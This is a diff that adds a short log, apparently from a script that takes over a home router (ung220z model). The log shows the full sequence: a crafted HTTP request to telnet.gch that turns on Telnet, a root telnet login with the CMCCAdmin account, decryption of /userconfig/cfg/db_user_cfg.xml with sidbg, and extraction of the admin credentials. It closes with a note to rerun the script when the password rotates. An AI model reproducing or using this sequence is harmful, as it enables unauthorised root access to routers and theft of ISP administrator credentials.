@@ -1,0 +1,13 @@
+[09:06:29] INFO   会话开始  目标=192.168.1.1  账户=user
+[09:06:29] INFO   日志文件 /tmp/ung220z_20261118_090608.log
+[09:06:29] PROBE  TCP 80/192.168.1.1 → open
+[09:06:29] INFO   释放残留 Web 会话 → ok
+[09:06:29] INFO   补全 URL: http://192.168.1.1/usr=user&psw=***&cmd=1&telnet.gch
+[09:06:30] HTTP   telnet.gch → TelnetSet Success!
+[09:06:30] PROBE  nc -zv 192.168.1.1 23 → succeeded
+[09:06:30] AUTH   Telnet CMCCAdmin / <pw> → 登录成功（root）
+[09:06:31] SHELL  id → uid=0(root) gid=0(root)
+[09:06:31] SHELL  sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml → /tmp/debug-decry-cfg
+[09:06:31] DATA   DevAuthInfo  CMCCAdmin / <pw>  Level=1
+[09:06:31] DATA   TS_UPwd      CMCCAdmin / <pw>
+[09:06:31] INFO   完成。口令每 15 分钟轮换，重跑本脚本即可取新值
